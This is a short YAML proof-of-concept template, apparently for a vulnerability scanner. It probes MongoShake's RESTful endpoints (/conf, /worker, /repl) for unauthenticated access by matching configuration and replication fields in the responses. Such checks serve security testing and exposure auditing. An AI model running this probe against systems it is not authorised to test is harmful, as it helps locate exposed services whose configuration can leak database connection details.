name: poc-yaml-mongoshake-restful-unauth
rules:
  - method: GET
    path: "/conf"
    expression: |
      response.status == 200 && response.body.bcontains(bytes(string(b"MongoUrls"))) && response.body.bcontains(bytes(string(b"MongoCsUrl")))
  - method: GET
    path: "/worker"
    expression: |
      response.status == 200 && response.body.bcontains(bytes(string(b"worker_id"))) && response.body.bcontains(bytes(string(b"jobs_in_queue")))
  - method: GET
    path: "/repl"
    expression: |
      response.status == 200 && response.body.bcontains(bytes(string(b"who"))) && response.body.bcontains(bytes(string(b"logs_repl")))
detail:
  author: sacredbook(blog.csdn.net/sacredbook)
  links:
    -https://github.com/alibaba/MongoShake/wiki/FAQ
